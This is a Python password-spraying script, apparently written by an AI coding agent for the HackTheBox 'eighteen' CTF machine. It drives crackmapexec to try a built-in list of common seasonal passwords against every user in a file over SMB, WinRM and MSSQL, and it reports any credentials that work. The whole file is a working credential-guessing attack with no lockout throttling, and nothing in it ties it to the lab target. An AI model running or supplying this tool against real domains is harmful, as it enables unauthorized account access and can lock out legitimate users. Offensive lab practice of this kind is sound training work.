#!/usr/bin/env python3
"""
Password spraying script for domain accounts on the eighteen HackTheBox machine
This script attempts to authenticate against various services with common passwords
"""

import subprocess
import sys
import argparse
from pathlib import Path


def load_users(user_file):
    """Load user list from file"""
    with open(user_file, 'r') as f:
        users = [line.strip() for line in f if line.strip()]
    return users


def load_passwords():
    """Load common passwords list"""
    # Common passwords that might be used in a CTF environment
    common_passwords = [
        "iloveyou1",
        "Password123!",
        "Welcome123!",
        "Summer2023!",
        "Winter2023!",
        "Spring2023!",
        "Fall2023!",
        "Password1!",
        "Password123",
        "P@ssw0rd123!",
        "Admin123!",
        "Qwerty123!",
        "1234567890",
        "Password!",
        "Welcome!",
        "Summer2025!",
        "Winter2025!",
        "Spring2025!",
        "Fall2025!",
        "Summer2024!",
        "Winter2024!",
        "Spring2024!",
        "Fall2024!",
    ]
    return common_passwords


def test_smb_login(domain, target, username, password):
    """Test SMB authentication using crackmapexec"""
    try:
        cmd = [
            'crackmapexec', 'smb', target,
            '-u', f"{domain}\\{username}",
            '-p', password
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        
        if "PWN3D" in result.stdout or "Status: Success" in result.stdout:
            print(f"[+] Successful SMB login: {domain}\\{username}:{password}")
            return True
        elif "STATUS_LOGON_FAILURE" not in result.stdout:
            # Show other potential issues (like account lockout, etc.)
            print(f"[*] Attempt for {domain}\\{username} with password '{password}': {result.stdout.strip()}")
        return False
    except subprocess.TimeoutExpired:
        print(f"[-] SMB login attempt timed out for {domain}\\{username}")
        return False
    except FileNotFoundError:
        print("[!] crackmapexec not found. Please install it with: pip3 install crackmapexec")
        return False
    except Exception as e:
        print(f"[!] Error testing SMB login for {domain}\\{username}: {str(e)}")
        return False


def test_winrm_login(domain, target, username, password):
    """Test WinRM authentication using crackmapexec"""
    try:
        cmd = [
            'crackmapexec', 'winrm', target,
            '-u', f"{domain}\\{username}",
            '-p', password
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        
        if "PWN3D" in result.stdout or "Authentication Successful" in result.stdout:
            print(f"[+] Successful WINRM login: {domain}\\{username}:{password}")
            return True
        elif "kerberos preauth failed" not in result.stdout.lower() and "access denied" not in result.stdout.lower():
            # Show other potential issues
            print(f"[*] WINRM attempt for {domain}\\{username} with password '{password}': {result.stdout.strip()}")
        return False
    except subprocess.TimeoutExpired:
        print(f"[-] WINRM login attempt timed out for {domain}\\{username}")
        return False
    except FileNotFoundError:
        # WinRM might not be available or crackmapexec might not have winrm module
        return False
    except Exception as e:
        # WinRM might not be available in some installations of crackmapexec
        return False


def test_mssql_login(domain, target, username, password):
    """Test MSSQL authentication using crackmapexec"""
    try:
        cmd = [
            'crackmapexec', 'mssql', target,
            '-u', f"{domain}\\{username}",
            '-p', password
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        
        if "MSSQL" in result.stdout and ("PWN3D" in result.stdout or "EXECUTE AS LOGIN" in result.stdout):
            print(f"[+] Successful MSSQL login: {domain}\\{username}:{password}")
            return True
        elif "Login failed" not in result.stdout and "Access was denied" not in result.stdout:
            # Show other potential issues
            print(f"[*] MSSQL attempt for {domain}\\{username} with password '{password}': {result.stdout.strip()}")
        return False
    except subprocess.TimeoutExpired:
        print(f"[-] MSSQL login attempt timed out for {domain}\\{username}")
        return False
    except FileNotFoundError:
        # MSSQL module might not be available in crackmapexec
        return False
    except Exception as e:
        # MSSQL might not be available in some installations of crackmapexec
        return False


def main():
    parser = argparse.ArgumentParser(description='Password spraying against domain accounts')
    parser.add_argument('target', help='Target IP address (e.g., 10.129.81.39)')
    parser.add_argument('-d', '--domain', default='EIGHTEEN', help='Domain name (default: EIGHTEEN)')
    parser.add_argument('-u', '--userlist', default='userlist.txt', help='File containing list of usernames')
    parser.add_argument('--services', default='smb,winrm,mssql', help='Services to spray against (comma-separated)')
    
    args = parser.parse_args()
    
    if not Path(args.userlist).exists():
        print(f"[!] Userlist file does not exist: {args.userlist}")
        sys.exit(1)
    
    users = load_users(args.userlist)
    passwords = load_passwords()
    
    print(f"[*] Starting password spraying against {args.target}")
    print(f"[*] Domain: {args.domain}")
    print(f"[*] Number of users: {len(users)}")
    print(f"[*] Number of passwords: {len(passwords)}")
    print(f"[*] Services: {args.services}")
    print("-" * 60)
    
    successful_logins = []
    
    # Parse services
    services = [s.strip() for s in args.services.split(',')]
    
    for password in passwords:
        print(f"\n[*] Trying password: {password}")
        print("-" * 40)
        
        for user in users:
            print(f"[*] Testing {args.domain}\\{user}:{password}")
            
            for service in services:
                if service.lower() == 'smb':
                    success = test_smb_login(args.domain, args.target, user, password)
                elif service.lower() == 'winrm':
                    success = test_winrm_login(args.domain, args.target, user, password)
                elif service.lower() == 'mssql':
                    success = test_mssql_login(args.domain, args.target, user, password)
                else:
                    print(f"[!] Unknown service: {service}")
                    continue
                
                if success:
                    successful_logins.append((service, f"{args.domain}\\{user}", password))
                    # Continue testing other services for same user/password combo
        
        # Check for successful logins and possibly pause to avoid lockouts
        if successful_logins:
            print(f"\n[!] Found {len(successful_logins)} successful login(s) so far:")
            for svc, user, pwd in successful_logins:
                print(f"    {svc}: {user}:{pwd}")
    
    print("\n" + "="*60)
    print("PASSWORD SPRAYING COMPLETE")
    print("="*60)
    
    if successful_logins:
        print(f"\n[+] Successful logins found:")
        for svc, user, pwd in successful_logins:
            print(f"    {svc}: {user}:{pwd}")
        print(f"\n[!] Don't forget to update QWEN.md with these credentials!")
    else:
        print("\n[-] No successful logins found")
        print("[*] Consider trying different passwords or other attack vectors")


if __name__ == "__main__":
    main()